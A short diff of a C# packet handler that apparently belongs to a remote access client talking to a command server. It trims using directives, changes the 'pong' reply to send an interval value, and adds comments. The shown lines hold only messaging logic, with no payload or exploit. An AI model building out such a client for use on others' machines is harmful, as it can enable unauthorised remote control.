@@ -4,12 +4,8 @@ using Client.MessagePack;
 using Client.Connection;
 using System;
 using System.Diagnostics;
-using System.IO;
-using System.Net.Sockets;
 using System.Reflection;
-using System.Text;
 using System.Threading;
-using System.Windows.Forms;
 using System.Collections.Generic;
 using Microsoft.VisualBasic;
 
@@ -25,12 +21,12 @@ namespace Client.Handle_Packet
                 unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
-                    case "pong":
+                    case "pong": //send interval value to server
                         {
-                            ClientSocket.Pong.Stop();
+                            int interval = (int)ClientSocket.Interval;
                             MsgPack msgPack = new MsgPack();
                             msgPack.ForcePathObject("Packet").SetAsString("pong");
-                            msgPack.ForcePathObject("Message").SetAsInteger(ClientSocket.Pong.ElapsedMilliseconds);
+                            msgPack.ForcePathObject("Message").SetAsInteger(interval);
                             ClientSocket.Send(msgPack.Encode2Bytes());
                             break;
                         }
@@ -80,7 +76,7 @@ namespace Client.Handle_Packet
             }
         }
 
-        private static void Received()
+        private static void Received() //reset client forecolor
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Received";
@@ -88,7 +84,7 @@ namespace Client.Handle_Packet
             Thread.Sleep(1000);
         }
 
-        public static void Error(string ex)
+        public static void Error(string ex) //send to logs
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "Error";
